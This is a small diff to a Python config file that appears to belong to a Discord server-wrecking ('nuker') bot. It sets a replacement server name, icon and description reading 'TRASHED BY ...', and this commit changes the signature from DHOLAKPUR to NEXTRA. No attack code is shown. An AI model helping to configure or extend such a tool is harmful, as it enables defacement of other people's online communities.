@@ -14,7 +14,7 @@ EMBED_CONFIG = {
 SERVER_CONFIG = {
     "new_name": "TRASHED BY DHOLAKPUR",  # New Server Name here 
     "new_icon": "https://images-ext-1.discordapp.net/external/W0YRxLPLoVwkIOZTSLsalqrmW895TI77ao9nHW4wfx4/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1217116527308963901/a_a69a3d18d6dea267b5de7bfa7d007f17.gif",   # New Server Icon url here → https://image.jpg 
-    "new_description": "TRASHED BY DHOLAKPUR",  # New Server Description here 
+    "new_description": "TRASHED BY NEXTRA",  # New Server Description here 
 }
 
 WEBHOOK_CONFIG = {
